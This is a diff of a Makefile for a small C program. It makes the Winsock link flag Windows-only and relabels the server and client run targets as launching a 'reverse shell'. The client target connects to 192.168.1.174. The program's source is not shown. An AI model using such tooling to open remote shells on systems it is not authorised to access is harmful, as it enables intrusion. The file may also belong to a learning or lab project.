@@ -2,10 +2,14 @@ OS := $(shell uname -s)
 
 CC = gcc
 CFLAGS = -Wall -Wextra -I./src
-LDFLAGS = -lws2_32
+LDFLAGS =
 SRC = src/main.c
 OBJ = main.o
 BIN = myProgram
+
+ifeq ($(findstring MINGW_NT, $(OS)),MINGW_NT)
+    LDFLAGS += -lws2_32
+endif
 
 all: $(BIN)
 
@@ -19,9 +23,9 @@ clean:
 	rm -f $(OBJ) $(BIN)
 
 exec-serv: all
-	@echo "=== Lancement du serveur ==="
+	@echo "=== Lancement du serveur (reverse shell) ==="
 	./$(BIN) -s
 
 exec-client: all
-	@echo "=== Lancement du client ==="
+	@echo "=== Lancement du client (reverse shell) ==="
 	./$(BIN) -c 192.168.1.174
